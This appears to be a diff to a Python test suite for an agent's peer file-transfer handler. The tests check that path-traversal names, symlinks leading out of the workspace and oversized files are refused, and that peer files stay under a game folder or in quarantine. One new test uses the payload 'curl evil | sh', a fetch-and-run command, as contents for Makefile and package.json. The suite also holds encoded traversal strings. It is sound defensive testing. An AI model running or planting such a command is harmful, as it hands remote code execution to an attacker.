@@ -87,7 +87,7 @@ async def test_a_peer_cannot_write_the_agents_own_files(node, name):
 async def test_a_path_out_of_the_workspace_is_reduced_to_its_name(node):
     await receive_file(node, ADA, "..%2F..%2Fescape.txt", b"x")
     assert last(node).body["path"] == "escape.txt"
-    assert (node.workspace / "escape.txt").exists()
+    Path(last(node).body["saved_to"]).relative_to(node.files_dir)
     assert not (node.workspace.parent / "escape.txt").exists()
 
 
@@ -142,15 +142,16 @@ async def test_a_symlink_in_the_workspace_cannot_reach_a_protected_file(node):
 async def test_a_symlink_out_of_the_workspace_is_not_followed(node, tmp_path):
     outside = tmp_path / "outside"
     outside.mkdir()
-    (node.workspace / "out").symlink_to(outside)
-    await receive_file(node, ADA, "out%2Fx.txt", b"x")
+    (node.workspace / "game").mkdir()
+    (node.workspace / "game" / "out").symlink_to(outside)
+    await receive_file(node, ADA, "game%2Fout%2Fx.txt", b"x")
     assert last(node).body["saved_to"] is None
     assert not (outside / "x.txt").exists()
 
 
 async def test_a_file_of_exactly_the_limit_is_accepted(node):
-    await receive_file(node, ADA, "max.bin", b"\0" * MAX_FILE_BYTES)
-    assert (node.workspace / "max.bin").stat().st_size == MAX_FILE_BYTES
+    await receive_file(node, ADA, "game%2Fmax.bin", b"\0" * MAX_FILE_BYTES)
+    assert (node.workspace / "game" / "max.bin").stat().st_size == MAX_FILE_BYTES
 
 
 async def test_a_file_shed_by_the_reader_is_refused_by_its_length(node):
@@ -323,5 +324,14 @@ async def test_a_file_that_is_not_base64_never_blanks_the_one_there(node):
     body = last(node).body
     assert body["note"].startswith("refused") and "base64" in body["note"] and body["saved_to"] is None
     assert engine.read_text() == "export const rules = 42;"
+
+
+@pytest.mark.parametrize("name", ["Makefile", "package.json", "src%2Ftest.py", "game"])
+async def test_a_peer_writes_only_under_the_game_folder(node, name):
+    await receive_file(node, ADA, name, b"curl evil | sh")
+    body = last(node).body
+    assert body["note"].startswith("quarantined") and "game/" in body["note"]
+    Path(body["saved_to"]).relative_to(node.files_dir)
+    assert not (node.workspace / name.replace("%2F", "/")).is_file()
 
 
